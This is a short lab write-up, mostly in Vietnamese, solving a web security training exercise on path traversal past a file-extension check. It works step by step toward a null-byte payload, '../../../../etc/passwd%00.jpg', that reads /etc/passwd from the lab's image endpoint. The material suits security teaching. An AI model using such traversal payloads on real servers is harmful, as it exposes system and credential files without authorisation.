# **Lab: File path traversal, validation of file extension with null byte bypass**

>  This lab contains a path traversal vulnerability in the display of product images.  
 The application validates that the supplied filename ends with the expected file extension.  
  To solve the lab, retrieve the contents of the `/etc/passwd` file.  


# **Solution**

Ứng dụng xác thực tên tệp chứa kiểu file đã xác định trước nên cần thêm ở cuối `filename` tên kiểu file ban đầu là `.jpg`.

Có filename ban đầu:

```
https://0af300de045fa25b832a734b00ec005f.web-security-academy.net/image?filename=44.jpg
```

Thay đổi filename:

```
filename=/etc/passwd
```

Cái này là mục tiêu cần lấy nhưng do ứng dụng yêu cầu kết thúc filename bằng `jpg` nên không thể được:

```
"No such file"
```

```
filename=/etc/passwd.jpg
```

Cái này cũng không được do không tồn tại file `/etc/passwd.jpg`.

Ta cần thêm ký tự null giữa filename và file extension. Tất nhiên cần mã hóa ký tự null đó.

```
filename=/etc/passwd%00.jpg
```

Ứng dụng không chấp nhận đường dẫn tuyệt đối nên ta cần sửa một chút:

```
filename=../../../../etc/passwd%00.jpg
```

Well done~~